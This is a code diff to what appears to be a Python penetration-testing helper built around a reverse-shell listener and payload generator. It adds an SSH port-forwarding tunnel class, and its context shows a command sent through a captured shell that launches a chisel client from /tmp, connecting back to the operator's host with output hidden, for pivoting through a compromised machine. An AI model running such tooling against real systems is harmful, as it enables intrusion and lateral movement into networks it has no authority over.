@@ -11,6 +11,13 @@ import threading
 import paramiko
 import readline
 import base64
+import select
+
+
+try:
+    import SocketServer
+except ImportError:
+    import socketserver as SocketServer
 
 class ShellListener:
 
@@ -162,6 +169,97 @@ class ShellListener:
         if permissions:
             self.sendline(f"chmod {permissions} {path}")
 
+class ParamikoTunnelServer(SocketServer.ThreadingTCPServer):
+    daemon_threads = True
+    allow_reuse_address = True
+
+
+class ParamikoTunnel:
+    def __init__(self, shell, ports):
+        self.shell = shell
+        self.ports = ports
+        self.verbose = False
+        self.is_running = True
+        self.on_message = []
+        self.listen_threads = []
+        self.servers = []
+
+    def start_background(self):
+        for port in self.ports:
+            thread = threading.Thread(target=self.start, args=(port, ))
+            thread.start()
+            self.listen_threads.append(thread)
+        return self.listen_threads
+
+    def start(self, port):
+        this = self
+        class SubHandler(ParamikoTunnelHandler):
+            peer = this.shell.get_transport().sock.getpeername()
+            chain_host = "127.0.0.1"
+            chain_port = port
+            ssh_transport = this.shell.get_transport()
+            def log(self, message):
+                if this.verbose:
+                    print(message)
+
+        forward_server = ParamikoTunnelServer(("127.0.0.1", port), SubHandler)
+        self.servers.append(forward_server)
+        forward_server.serve_forever()
+
+    def close(self):
+        self.is_running = False
+        for server in self.servers:
+            server._BaseServer__shutdown_request = True
+        for thread in self.listen_threads:
+            thread.join()
+
+class ParamikoTunnelHandler(SocketServer.BaseRequestHandler):
+    def handle(self):
+        try:
+            chan = self.ssh_transport.open_channel(
+                "direct-tcpip",
+                (self.chain_host, self.chain_port),
+                self.request.getpeername(),
+            )
+        except Exception as e:
+            self.log(
+                "Incoming request to %s:%d failed: %s"
+                % (self.chain_host, self.chain_port, repr(e))
+            )
+            return
+        if chan is None:
+            self.log(
+                "Incoming request to %s:%d was rejected by the SSH server."
+                % (self.chain_host, self.chain_port)
+            )
+            return
+
+        self.log(
+            "Connected!  Tunnel open %r -> %r -> %r"
+            % (
+                self.request.getpeername(),
+                chan.getpeername(),
+                (self.chain_host, self.chain_port),
+            )
+        )
+        while True:
+            r, w, x = select.select([self.request, chan], [], [])
+            if self.request in r:
+                data = self.request.recv(1024)
+                if len(data) == 0:
+                    break
+                chan.send(data)
+            if chan in r:
+                data = chan.recv(1024)
+                if len(data) == 0:
+                    break
+                self.request.send(data)
+
+        peername = self.request.getpeername()
+        chan.close()
+        self.request.close()
+        self.log("Tunnel closed from %r" % (peername,))
+
 def generate_payload(type, local_address, port, index=None):
 
     commands = []
@@ -238,7 +336,13 @@ def create_tunnel(shell, ports: list):
         t.start()
 
         shell.sendline(f"/tmp/chisel64 client --max-retry-count 1 {ipAddress}:{chiselPort} {ports} 2>&1 >/dev/null &")
+        return t
     elif isinstance(shell, paramiko.SSHClient):
+
+        paramiko_tunnel = ParamikoTunnel(shell, ports)
+        paramiko_tunnel.start_background()
+        return paramiko_tunnel
+
         # TODO: https://github.com/paramiko/paramiko/blob/88f35a537428e430f7f26eee8026715e357b55d6/demos/forward.py#L103
         pass
 
